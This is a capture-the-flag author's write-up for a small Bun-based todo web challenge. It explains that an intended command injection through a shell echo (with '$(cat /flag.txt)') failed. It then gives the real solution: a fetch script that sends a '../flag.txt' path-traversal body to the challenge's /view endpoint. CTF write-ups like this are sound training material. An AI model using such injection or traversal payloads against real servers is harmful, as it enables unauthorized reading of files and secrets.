# How did it go?
The vulnurability I was trying to expose did not work the way I intended. This probably has to do with the [Bun runtime](https://bun.sh/) not excecuting bash the way I thought it would.
for example:

```js
//You would thinkg writing $(cat /flag.txt) would make that excecte and input the flag to the file but it doesn't
//Instead it writes the actual string "$(cat /flag.txt)" into the file and not excecuting
const createfile = await $`echo ${data1} > ${req.query.auth}/${data2}`.text()
```
The difficulty is changed from a 0.4 to a 0.2
This is because there is not much knowledge about bash required as it is only a path and the auth is exposed in the query params and not in the headers so it is easy to notice
Now you just have to understand that the "todo" is read is a directory
# What does the hacker have access to?
The hacker has access to only the website before finding the exploit.
The website sends 3 different serevr requests:
* /view: opens a file/todo (like cat), This is where you solve it
* /list: lists the todos (like ls). I did an empty path so it will be easier for the hacker to find the flag when they found the exploit
* /create: echos data into a file. This was meant to be the exploit but as meanti9oned above it never worked
# How do you solve it
It is solved by sending a request to the /view endpoint with a body that goes to the flag
The auth has to exist so people don't have the same todos when going to the website
I also think that is a good skill to learn that you often can copy the auth tokens from the web cookies/headers or query params to use an API with a script
This is how my project [Rustalytics](https://rustalytics.com) has done with the api endpoints of a rust server to provide a good service
```js
let headersList = {
 "Accept": "*/*",
 "User-Agent": "Thunder Client (https://www.thunderclient.com)",
 "Content-Type": "application/json"
}

let bodyContent = JSON.stringify({"todo": "../flag.txt"});
const id = ""//your auth id
let response = await fetch(`https://ctfdb.rustalytics.com/view?auth=${id}`, { 
  method: "POST",
  body: bodyContent,
  headers: headersList
});

let data = await response.text();
console.log(data);

``` 
